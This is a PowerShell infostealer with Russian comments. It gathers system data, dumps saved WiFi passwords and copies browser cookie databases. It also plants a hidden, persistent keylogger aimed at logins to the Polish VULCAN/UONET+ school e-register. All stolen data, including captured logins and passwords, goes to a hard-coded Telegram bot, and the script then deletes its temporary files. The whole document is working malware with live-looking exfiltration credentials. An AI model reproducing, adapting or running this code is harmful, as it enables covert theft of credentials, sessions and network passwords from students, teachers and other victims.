# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
$keyloggerStatus = "Starting..."

# Создаем улучшенный кейлоггер
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Runtime.InteropServices

# API для получения информации о браузерах
`$signature = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();

[DllImport("user32.dll")]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);

[DllImport("user32.dll")]
public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
'@

Add-Type -MemberDefinition `$signature -Name Win32 -Namespace Api

# Список целевых сайтов Вулкан
`$vulcanUrls = @(
    "*vulcan*",
    "*uonetplus*", 
    "*dziennik*",
    "*edu.gdynia*",
    "*eszkola.opolskie.pl*",
    "*cufs.vulcan.net.pl*",
    "*dziennik-logowanie.vulcan.net.pl*",
    "*Account/LogOn*",
    "*minrol*"
)

`$capturedData = @()
`$currentWindow = ""
`$buffer = ""
`$isVulcanSite = `$false
`$loginData = ""
`$passwordData = ""
`$lastProcessName = ""

function Get-ActiveWindowInfo {
    try {
        `$hWnd = [Api.Win32]::GetForegroundWindow()
        if(`$hWnd -eq [IntPtr]::Zero) { return `$null }
        
        `$titleBuilder = New-Object System.Text.StringBuilder 256
        `$result = [Api.Win32]::GetWindowText(`$hWnd, `$titleBuilder, `$titleBuilder.Capacity)
        
        `$processId = 0
        [Api.Win32]::GetWindowThreadProcessId(`$hWnd, [ref]`$processId)
        
        if(`$processId -ne 0) {
            `$process = Get-Process -Id `$processId -ErrorAction SilentlyContinue
            `$processName = if(`$process) { `$process.ProcessName } else { "Unknown" }
        } else {
            `$processName = "Unknown"
        }
        
        return @{
            Title = `$titleBuilder.ToString()
            ProcessName = `$processName
            ProcessId = `$processId
        }
    } catch {
        return `$null
    }
}

function Test-VulcanSite {
    param(`$windowInfo)
    
    if(!`$windowInfo) { return `$false }
    
    `$title = `$windowInfo.Title
    `$process = `$windowInfo.ProcessName.ToLower()
    
    # Проверяем браузеры
    `$isBrowser = `$process -match "chrome|firefox|edge|iexplore|opera|brave"
    
    if(!`$isBrowser) { return `$false }
    
    # Проверяем заголовок на наличие ключевых слов Вулкан
    foreach(`$url in `$vulcanUrls) {
        if(`$title -like `$url) {
            return `$true
        }
    }
    
    # Дополнительные проверки для популярных браузеров
    if(`$isBrowser) {
        # Проверяем URL через JavaScript injection simulation
        `$browserKeywords = @("vulcan", "dziennik", "uonet", "logowanie", "login", "password", "hasło")
        foreach(`$keyword in `$browserKeywords) {
            if(`$title -match `$keyword) {
                return `$true
            }
        }
    }
    
    return `$false
}

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
    } catch { }
}

function Process-Buffer {
    if(`$buffer -ne "") {
        # Определяем тип данных по контексту
        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
            `$script:loginData = `$buffer
            Send-ToTelegram "🔑 VULCAN LOGIN DETECTED: `$buffer"
        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
            `$script:passwordData = `$buffer
            Send-ToTelegram "🔒 VULCAN PASSWORD DETECTED: `$buffer"
        } else {
            # Проверяем, похоже ли на логин (содержит @ или типичные логины)
            if(`$buffer -match ".+@.+\..+" -or `$buffer -match "^[a-zA-Z0-9._-]{3,20}`$") {
                `$script:loginData = `$buffer
                Send-ToTelegram "🔑 VULCAN LOGIN (AUTO-DETECTED): `$buffer"
            } else {
                # Отправляем обычные данные только если они не пустые и не служебные
                if(`$buffer.Trim() -ne "" -and `$buffer -notmatch "^\[.*\]`$") {
                    Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
                }
            }
        }
        
        # Если есть и логин и пароль - отправляем вместе
        if(`$script:loginData -ne "" -and `$script:passwordData -ne "") {
            Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$script:loginData`nPassword: `$script:passwordData"
            `$script:loginData = ""
            `$script:passwordData = ""
        }
        
        `$script:capturedData += `$buffer
        `$script:buffer = ""
    }
}

function Handle-KeyPress {
    param(`$key)
    
    switch(`$key) {
        "Enter" { 
            Process-Buffer
        }
        "Space" { 
            `$script:buffer += " " 
        }
        "Back" { 
            if(`$script:buffer.Length -gt 0) { 
                `$script:buffer = `$script:buffer.Substring(0, `$script:buffer.Length - 1) 
            }
        }
        "Tab" { 
            `$script:buffer += "[TAB]"
            Process-Buffer
        }
        "LButton" { 
            Process-Buffer
        }
        "RButton" { 
            Process-Buffer
        }
        "Escape" {
            `$script:buffer = ""
        }
        default {
            # Обрабатываем обычные символы
            if(`$key -ge 65 -and `$key -le 90) {
                # Буквы A-Z
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                
                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                    `$script:buffer += `$key.ToString()
                } else {
                    `$script:buffer += `$key.ToString().ToLower()
                }
            } elseif(`$key -ge 48 -and `$key -le 57) {
                # Цифры 0-9
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                if(`$isShift) {
                    `$script:buffer += `$symbols[`$key - 48]
                } else {
                    `$script:buffer += (`$key - 48).ToString()
                }
            } elseif(`$key -eq 190 -or `$key -eq 110) {
                # Точка
                `$script:buffer += "."
            } elseif(`$key -eq 189 -or `$key -eq 109) {
                # Минус/дефис
                `$script:buffer += "-"
            } elseif(`$key -eq 187 -or `$key -eq 107) {
                # Плюс/равно
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$isShift) {
                    `$script:buffer += "+"
                } else {
                    `$script:buffer += "="
                }
            } elseif(`$key -eq 186 -or `$key -eq 59) {
                # Точка с запятой/двоеточие
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$isShift) {
                    `$script:buffer += ":"
                } else {
                    `$script:buffer += ";"
                }
            } elseif(`$key -eq 222 -or `$key -eq 192) {
                # Кавычки/апостроф/тильда
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$key -eq 222) {
                    if(`$isShift) {
                        `$script:buffer += "`""
                    } else {
                        `$script:buffer += "'"
                    }
                } else {
                    if(`$isShift) {
                        `$script:buffer += "~"
                    } else {
                        `$script:buffer += "`""
                    }
                }
            }
        }
    }
    
    # Автоматически отправляем длинные вводы
    if(`$script:buffer.Length -gt 30) {
        Process-Buffer
    }
}

# Основной цикл
while(`$true) {
    try {
        `$windowInfo = Get-ActiveWindowInfo
        `$isCurrentlyVulcan = Test-VulcanSite -windowInfo `$windowInfo
        
        if(`$isCurrentlyVulcan) {
            if(!`$script:isVulcanSite) {
                `$script:isVulcanSite = `$true
                `$script:lastProcessName = `$windowInfo.ProcessName
                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`nTitle: `$(`$windowInfo.Title)`nBrowser: `$(`$windowInfo.ProcessName)"
            }
        } else {
            if(`$script:isVulcanSite) {
                `$script:isVulcanSite = `$false
                Process-Buffer
                Send-ToTelegram "📱 USER LEFT VULCAN SITE (Browser: `$script:lastProcessName)"
                `$script:lastProcessName = ""
            }
        }
        
        # Перехватываем нажатия клавиш только на сайтах Вулкан
        if(`$script:isVulcanSite) {
            for(`$i = 8; `$i -lt 255; `$i++) {
                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                if(`$keyState -eq -32767) {
                    `$key = [System.Windows.Forms.Keys]`$i
                    Handle-KeyPress -key `$key
                }
            }
        }
    } catch { 
        # Игнорируем ошибки для стабильности
    }
    Start-Sleep -Milliseconds 1
}
"@

# Сохраняем и запускаем улучшенный кейлоггер
try {
    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger_advanced.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_advanced.ps1`"" -WindowStyle Hidden
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_advanced.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ Advanced Vulcan keylogger ACTIVE - monitoring ALL browsers"
} catch {
    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== TARGET SITES ===
• https://cufs.vulcan.net.pl/minrol/Account/LogOn
• Все сайты Vulcan/UONET+
• Страницы входа в дневник

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
